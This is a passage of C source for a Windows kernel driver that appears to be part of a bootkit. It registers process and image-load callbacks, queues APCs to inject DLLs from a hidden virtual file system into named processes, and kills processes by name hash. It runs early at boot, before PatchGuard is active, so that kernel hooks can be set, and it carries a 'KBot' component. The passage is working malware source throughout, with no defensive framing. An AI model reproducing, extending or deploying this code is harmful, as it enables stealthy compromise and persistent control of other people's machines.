				SearchAndKillProcess(NameHash);
#endif
				ntStatus = STATUS_SUCCESS;
			}

			ProcessList = pStr;
		}	// while(ProcessList && ProcessList[0] != 0)
	} while(FALSE);

	if (!NT_SUCCESS(ntStatus) && Buffer && !pImageBuffer)
		// In case of an error releasing DLL buffer
		MyFreePool(Buffer);

	KdPrint(("KLDR: AddInject finished with status: 0x%X\n", ntStatus));

	return(ntStatus);
}


//
//	Removes all inject descriptors either for the specified module or for the specified process.
//	Returns number of inject descriptors removed.
//
ULONG KldrRemoveInject(
	PCHAR	InjectModuleName,	// Name of the inject module to remove injects for
	ULONG	ProcessNameHash		// Hash of the name of the processs to remove injects for
	)
{
	PLIST_ENTRY		pEntry;
	PINJECT_DESCRIPTOR	InjDesc;
	ULONG	Count = 0, InjectModuleId;
	ANSI_STRING aModuleName;

	RtlInitAnsiString(&aModuleName, InjectModuleName);
	InjectModuleId = ModuleNameCrc32A(&aModuleName);

	LockInjectDescriptorList();
	pEntry = g_InjectDescriptorListHead.Flink;
	while(pEntry != &g_InjectDescriptorListHead)
	{
		InjDesc = CONTAINING_RECORD(pEntry, INJECT_DESCRIPTOR, InjectListEntry);
		pEntry = pEntry->Flink;

		if (((InjectModuleId) && (InjDesc->InjectModuleId == InjectModuleId)) || 
			((ProcessNameHash) && (InjDesc->Flags & INJECT_SPECIFIED_PROCESS) && (InjDesc->TargetProcessHash == ProcessNameHash)))
		{
			// Removing inject descriptor from the InjectDescriptorList
			RemoveEntryList(&InjDesc->InjectListEntry);
			// Decrementing it's reference count: inject desciptor will be released when it's reference count reaches 0
			DereferenceInjectDescriptor(InjDesc);
			Count += 1;
		}
	}	// while(pEntry != &g_InjectDescriptorListHead)
	UnlockInjectDescriptorList();
	return(Count);
}


// ---- Filter routines -----------------------------------------------------------------------------------------------------


VOID _stdcall	MyCreateProcessNotifyRoutine(
	IN HANDLE  ParentId,
	IN HANDLE  ProcessId,
	IN BOOLEAN  Create
	)
{
	PPID_CONTEXT	PidCtx;
	UNICODE_STRING	ProcessImagePath = {0};
	PINJECT_DESCRIPTOR	InjDesc;

	ENTER_WORKER();

	if (Create)
	{
		// Process is just being created
		if (NT_SUCCESS(GetProcessImagePath(ProcessId, &ProcessImagePath)))
		{
			FindAttachInjectDescriptor(ProcessId, ParentId, &ProcessImagePath);
			MyFreePool(ProcessImagePath.Buffer);
		}	// if (NT_SUCCESS(GetProcessImagePath(ProcessId, &ProcessPath)))
	}
	else
	{
		// Process is being terminated
		if (PidCtx = PidGetContext(ProcessId))
		{
			while(PidCtx->InjectCount)
			{
				InjDesc = PidCtx->InjectContext[PidCtx->InjectCount - 1].InjDesc;
				DereferenceInjectDescriptor(InjDesc);
				PidCtx->InjectCount -= 1;
			}

			PidDeleteContext(PidCtx);
			PidReleaseContext(PidCtx);
		}	// if (PidCtx = PidGetContext(ProcessId))
	}
	LEAVE_WORKER();
}


VOID _stdcall MyLoadImageNotifyRoutine(
						PUNICODE_STRING	FullImageName,
						HANDLE			ProcessId,
						PIMAGE_INFO		ImageInfo
						)
{
	UNICODE_STRING	ShortImageName = {0};
	PPID_CONTEXT	PidCtx = NULL;
	PINJECT_CONTEXT	InjCtx = NULL;
	ULONG	i = 0;

	ENTER_WORKER();

	if (PidCtx = PidGetContext(ProcessId))
	{
		while(i < PidCtx->InjectCount)
		{
			PINJECT_DESCRIPTOR	InjDesc;
			InjCtx = &PidCtx->InjectContext[i];

			ASSERT(InjCtx->InjDesc);
			InjDesc = InjCtx->InjDesc;

			i += 1;

#ifdef _M_AMD64
			if ((PidCtx->Flags & INJECT_WOW64_PROCESS) && (InjDesc->Flags & INJECT_AMD64_PROCESS))
				continue;

			if (!(PidCtx->Flags & INJECT_WOW64_PROCESS) && !(InjDesc->Flags & INJECT_AMD64_PROCESS))
				continue;
#endif
			if (InjCtx->Flags & INJECT_STATE_INJECTED)
				continue;

			if (InjCtx->Flags & INJECT_STATE_WAITING_APC)
			{			
		
#ifdef _M_AMD64
				if (EqualModuleName(FullImageName, &g_uWowNtdll))
				{
					// WOW64 ntdll loaded
					ResolveNtdllImport(ImageInfo->ImageBase, &PidCtx->Import);
					break;
				}

				if ((PidCtx->Flags & (INJECT_WOW64_PROCESS | INJECT_WOW64_LOADED)) == INJECT_WOW64_PROCESS)
				{
					if (EqualModuleName(FullImageName, &g_uWow64))
					{
						InjCtx->ApcRoutine = BkGetFunctionAddress(ImageInfo->ImageBase, "Wow64ApcRoutine");
						InjCtx->ApcContext = (PVOID)((ULONG_PTR)InjCtx->LdrCtx + ((ULONG_PTR)&InjCtx->LdrCtx->LoaderStub << 32));
						PidCtx->Flags |= INJECT_WOW64_LOADED;
					}
					break;
				}	// if (IsWow64Process(ProcessId))
#endif

				if (EqualModuleName(FullImageName, &g_uKernel32))
				{
					PidCtx->Flags |= INJECT_KERNEL_LOADED;
					break;
				}
					
				// We cannot inject a DLL before kernel32 and kernelbase are loaded.
				// We also have to skip user32 and gdi32, beacause of strange situation with possible loading of theese modules
				//	not at base on XP.
				if ((PidCtx->Flags & INJECT_KERNEL_LOADED) && !EqualModuleName(FullImageName, &g_uKernelbase) && 
					!EqualModuleName(FullImageName, &g_uUser32) && !EqualModuleName(FullImageName, &g_uGdi32))
				{
					RtlCopyMemory(&InjCtx->LdrCtx->Import, &PidCtx->Import, sizeof(PROCESS_IMPORT));
					KldrQueueApc(PsGetCurrentThread(), InjCtx->ApcRoutine, InjCtx->ApcContext, (PidCtx->Flags & INJECT_WOW64_PROCESS));
					InjCtx->Flags |= INJECT_STATE_INJECTED;
				}
			}
			else	// if (InjCtx->Flags & INJECT_STATE_WAITING_APC)
			{
				if (EqualModuleName(FullImageName, &g_uNtdll))
				{
					ResolveNtdllImport(ImageInfo->ImageBase, &PidCtx->Import);
					InjectInitializeStub(ProcessId, InjCtx, (FUNC_PROTECT_MEM)PidCtx->Import.pZwProtectVirtualMemory, (PidCtx->Flags & INJECT_WOW64_PROCESS));
				}				
			}	// else	// if (InjCtx->Flags & INJECT_STATE_WAITING_APC)
		}	// while(i < PidCtx->InjectCount)
		PidReleaseContext(PidCtx);
	}	// if (PidCtx = PidGetContext(ProcessId))

	LEAVE_WORKER();
}

#ifdef _BK_VFS

//
//	Loads and parses inject configuration file. 
//	Inserts injects described within the file. Removes previosly defined injects for every specified DLL.
//	Inject configuration file contains text lines devided by CR or LF (or both), of the followin format:
//		DLLNAME.DLL process1.exe process2.exe
//	Where:
//		"DLLNAME.DLL" is the name of the DLL located on the VFS (must be in upper case).
//		"process1.exe process2.exe" - list of names of the processes to inject into.
//	To disable injects for a DLL just specify it's name without a process list.
//
NTSTATUS KldrLoadInjectConfig(VOID)
{
	NTSTATUS ntStatus;
	PCHAR	Buffer, TextBuffer, Line, LineBuffer, DllName, ProcessList = NULL;
	ULONG	Size, LineSize, TextSize = 0;

	// Loading inject configuration file
	ntStatus = FsLoadFile(&g_InjectFile, &Buffer, &TextSize);
	if (NT_SUCCESS(ntStatus) && TextSize)
	{
		TextBuffer = Buffer;
		Size = TextSize;

		if (LineBuffer = MyAllocatePool(PagedPool, TextSize + 1))
		{
			// Processing text lines
			while(BufferGetLine(TextBuffer, Size, &Line, &LineSize))
			{
				ASSERT(LineSize <= Size);
				TextBuffer = Line + LineSize;
				Size = (TextSize - (ULONG)(TextBuffer - Buffer));
		
				// Since there can be the last text line not containing a terminating character
				//  copying it into the pre-allocated buffer and adding the NULL-char.
				memcpy(LineBuffer, Line, LineSize);
				LineBuffer[LineSize] = 0;

				// Parsing command line, resolving target DLL name and list of processes
				if (ParseCommandLine(LineBuffer, &DllName, &ProcessList, NULL, NULL))
				{
					// Removing all previously defind injects for the specified DLL
					KldrRemoveInject(DllName, 0);

					if ((ProcessList) && ProcessList[0])
						// Addinig new injects for the DLL
						KldrAddInject(DllName, ProcessList, NULL, 0, 0, 0);
				}
			}	// while(BufferGetLine(TextBuffer, Size, &Line, &LineSize))
			MyFreePool(LineBuffer);
		}	// if (LineBuffer = MyAllocatePool(PagedPool, Size + 1))
		MyFreePool(Buffer);
	}	// if (NT_SUCCESS(ntStatus) && Size)

	return(ntStatus);
}

//
//	Adds the specified command line to the inject configuration file.
//	The command line contains name of a inject module allocated on VFS and a list of processes to inject the module to.
//
NTSTATUS KldrAddInjectConfig(
	PCHAR	InjectStr	// inject configuration string
	)
{
	NTSTATUS ntStatus = STATUS_INVALID_PARAMETER;
	PCHAR	NewBuffer, Line = NULL, TextBuffer = NULL, Buffer = NULL, NewDllName, NewProcessList;
	ULONG	DllNameSize, InjectStrSize, LineSize = 0, Size = 0, TextSize = 0;

	InjectStrSize = strlen(InjectStr);
	if (ParseCommandLine(InjectStr, &NewDllName, &NewProcessList, NULL, NULL))
	{		
		// Removing all previously defind injects for the specified DLL
		KldrRemoveInject(NewDllName, 0);
		
		if ((NewProcessList) && NewProcessList[0])
		// Addinig new injects for the DLL
			KldrAddInject(NewDllName, NewProcessList, NULL, 0, 0, 0);

		DllNameSize = strlen(NewDllName);

		// Loading inject configuration file
		ntStatus = FsLoadFile(&g_InjectFile, &Buffer, &TextSize);
		if (NT_SUCCESS(ntStatus) && TextSize)
		{
			TextBuffer = Buffer;
			Size = TextSize;

			// Processing text lines
			while(BufferGetLine(TextBuffer, Size, &Line, &LineSize))
			{
				TextBuffer = Line + LineSize;
				Size = (TextSize - (ULONG)(TextBuffer - Buffer));

				if (LineSize > DllNameSize && RtlEqualMemory(NewDllName, Line, DllNameSize))
					break;
				LineSize = 0;
			}	// while(BufferGetLine(TextBuffer, Size, &Line, &LineSize))
		}	// if (NT_SUCCESS(ntStatus) && Size)
		
		if (LineSize)
			LineSize = (ULONG)(Line - Buffer);
		else
			LineSize = TextSize;

		if (NewBuffer = MyAllocatePool(PagedPool, LineSize + InjectStrSize + sizeof(USHORT) + Size))
		{			
			if (LineSize)
			{
				// Copying a part of the text previouse to the selected line
				RtlCopyMemory(NewBuffer, Buffer, LineSize);
				
				// inserting CRLF between the prevouse line and the current one
				if (Buffer[LineSize-1] != 0x0d && Buffer[LineSize-1] != 0x0a)
				{
					*(PUSHORT)(NewBuffer + LineSize) = 0x0d0a;
					LineSize += sizeof(USHORT);
				}
			}	// if (LineSize)

			InjectStr[DllNameSize] = ' ';
			RtlCopyMemory(NewBuffer + LineSize, InjectStr, InjectStrSize);
			LineSize += InjectStrSize;

			if (Size)
			{
				// Copying a part of the text next to the selected line
				RtlCopyMemory(NewBuffer + LineSize, TextBuffer, Size);
				LineSize += Size;
			}

			// Writing modified buffer to a file
			ntStatus = FsSaveFile(&g_InjectFile, NewBuffer, LineSize);

			MyFreePool(NewBuffer);
		}	// if (NewBuffer = MyAllocatePool(PagedPool, LineSize + InjectStrSize + sizeof(USHORT) + Size))
		else
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;

		if (Buffer)
			MyFreePool(Buffer);
	}	// if (ParseCommandLine(InjectStr, &NewDllName, &NewProcessList, NULL, NULL))

	return(ntStatus);
}
#endif	// _BK_VFS

//
//	Since our driver coud be started early at system startup, there could be neither disk device no file system yet.
//	This function waits until file system initialized and then activates KREP if any.
//
VOID	DelayInitThread(PVOID Context)
{
	NTSTATUS	ntStatus;
	UNICODE_STRING	uDirectory = RTL_CONSTANT_STRING(wczSystemRoot);
	IO_STATUS_BLOCK	IoStatus = {0};
	OBJECT_ATTRIBUTES	oa = {0};
	LARGE_INTEGER		Interval;
	HANDLE				hDir;
	BK_FS_AREA			FsArea;

	Interval.QuadPart = _RELATIVE(_MILLISECONDS(100));
	
	InitializeObjectAttributes(&oa, &g_FsVolumeDevice, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	// Trying to open FS disk device.
	do 
	{		
		ntStatus = ZwOpenFile(&hDir, GENERIC_READ | SYNCHRONIZE, &oa, &IoStatus, 
			FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);

		if (NT_SUCCESS(ntStatus))
			break;

		KeDelayExecutionThread(KernelMode, TRUE, &Interval);
	} while(!NT_SUCCESS(ntStatus));

	ZwClose(hDir);

#if (defined(_BK_VFS) || defined(_BK_FILTER))
	// Obtaining FS area information, coz we need it for VFS and for the Filter too.
	ntStatus = FsLibGetFsArea(&FsArea);
#endif
#ifdef	_BK_FILTER
	if (NT_SUCCESS(ntStatus))
		ntStatus = FltStartup(&FsArea);
#endif
#ifdef	_BK_VFS
	if (NT_SUCCESS(ntStatus))
		ntStatus = FsLibActivate(&FsArea);
	// Loading and processing an inject configuration file if any
	if (NT_SUCCESS(ntStatus))
		KldrLoadInjectConfig();
#endif
#ifdef	_BK_KBOT
	if (NT_SUCCESS(ntStatus))
		ntStatus = KBotStartup();
#endif

	UNREFERENCED_PARAMETER(Context);
}

//
// Create FS wait thread.
//
NTSTATUS	StartDelayInitThread(VOID)
{
	HANDLE		hThread;
	NTSTATUS	ntStatus;
	OBJECT_ATTRIBUTES	oa = {0};

	InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	ntStatus = PsCreateSystemThread(&hThread, GENERIC_ALL, &oa, NULL, NULL, &DelayInitThread, NULL);
	if (NT_SUCCESS(ntStatus))
		ZwClose(hThread);
	return(ntStatus);
}


// ---- Startup/cleanup ----------------------------------------------------------------------------------------------------


#ifdef _DRIVER_SUPPORTS_UNLOAD
VOID DriverUnload(PDRIVER_OBJECT  DriverObject)
{
	ASSERT(g_ActiveProcessDb);

	PsRemoveLoadImageNotifyRoutine(&MyLoadImageNotifyRoutine);
	PsSetCreateProcessNotifyRoutine(&MyCreateProcessNotifyRoutine, TRUE);

#ifdef	_BK_KBOT
	KBotCleanup();
#endif

	WaitWorkers();
	HandleReleaseTable(g_ActiveProcessDb);

#ifdef	_BK_VFS
	FsLibCleanup(DriverObject);
#endif

#ifdef	_BK_FILTER
	FltCleanup();
#endif

	UNREFERENCED_PARAMETER(DriverObject);
}
#endif


NTSTATUS	DriverStartup(
				IN PDRIVER_OBJECT  DriverObject,
				IN PUNICODE_STRING RegistryPath
				)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;

	BkInitDriverDispatch(DriverObject);

	ntStatus = HandleAllocateTable(&g_ActiveProcessDb, sizeof(PID_CONTEXT), NULL, NULL);
	if (NT_SUCCESS(ntStatus))
	{
		InitializeAddons();

		ntStatus = PsSetCreateProcessNotifyRoutine(&MyCreateProcessNotifyRoutine, FALSE);
		if (NT_SUCCESS(ntStatus))
		{
			ntStatus = PsSetLoadImageNotifyRoutine(&MyLoadImageNotifyRoutine);
#ifdef _DRIVER_SUPPORTS_UNLOAD
			DriverObject->DriverUnload = &DriverUnload;
#endif
		}

		if (!NT_SUCCESS(ntStatus))
		{
			PsSetCreateProcessNotifyRoutine(&MyCreateProcessNotifyRoutine, TRUE);
			HandleReleaseTable(g_ActiveProcessDb);
		}
		else
		{
#ifdef	_BK_KIP
			ntStatus = KipStartup(DriverObject, RegistryPath);
#endif
#ifdef	_BK_VFS
			ntStatus = FsLibStartup(DriverObject, RegistryPath);
#endif

			if(NT_SUCCESS(ntStatus))
				StartDelayInitThread();
		}

	}	// if (NT_SUCCESS(ntStatus))

	return(ntStatus);
}


//
//	This function called by the BK loader early at the system startup. 
//	PatchGuard is not active yet, so we can set our hooks here.
//	Unfortunately NT kernel is also not initialized. That's why no kernel APIs available. :(
//
NTSTATUS	_stdcall DriverInitialize(PVOID	LdrContext)
{
	NTSTATUS	ntStatus;

	// Call BkInitialize() first to initialize driver's import 
	ntStatus = BkInstall(LdrContext);

#ifdef	_BK_KIP
	if (NT_SUCCESS(ntStatus))
	{
		// Imports are resolved successfully. BK init complete. Setting our hooks.
		ntStatus = KipInitialize();
	}
#endif

	return(ntStatus);
}


//
// Our driver entry
//
NTSTATUS 
DriverEntry(
	IN PDRIVER_OBJECT  DriverObject,
	IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS ntStatus = BkInitialize(DriverObject, RegistryPath, &DriverInitialize, &DriverStartup);

	return(ntStatus);
}


//
//	Just a stub required to successfully link debug-built WIN32 libraries.
//
VOID __cdecl _CrtDbgReportW(VOID)
{
}